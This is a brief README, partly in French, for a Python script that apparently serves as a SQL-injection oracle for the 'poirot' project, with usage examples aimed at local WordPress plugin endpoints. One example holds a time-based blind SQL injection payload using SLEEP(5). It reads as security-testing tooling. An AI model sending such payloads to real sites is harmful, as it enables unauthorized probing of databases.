# oracleSQL
pour PFGimenez/poirot
## Utilisation
retourne 0 si la chaine de caractère est syntaxiquement valide, 1 sinon<br>

**`url`**`string` url of the target<br>
**`payload`**`dict` default params (GET) or payload (POST)  			`❗ value and key between SIMPLE quotes` <br>
**`vulnparam`**`string` name of param on which we add injtxt<br>
**`[errmode]`**`string` different modes for detect errors (optional)<br>
**`injtxt`**`string` injection text 									`❗ between DOUBLE quotes`<br>
#### GET
```
python sqloracl.py <url> GET <payload> <vulnparam> <errmode> <injtxt>
```
exemple :
```
python sqloracl.py http://localhost/injections/wordp/wp-admin/wp-admin/admin.php GET "{'action':'dt_duplicate_post_as_draft','post':''}" post default ""
```
#### POST
```
python sqloracl.py <url> POST <payload> <vulnparam> <errmode> <injtxt>
```
exemple :
```
python sqloracl.py http://localhost/injections/wordp/wp-admin/admin-ajax.php POST "{'action':'spAjaxResults','pollid':'2'}" pollid default " AND (SELECT 1158 FROM (SELECT(SLEEP(5)))eipW)"
```
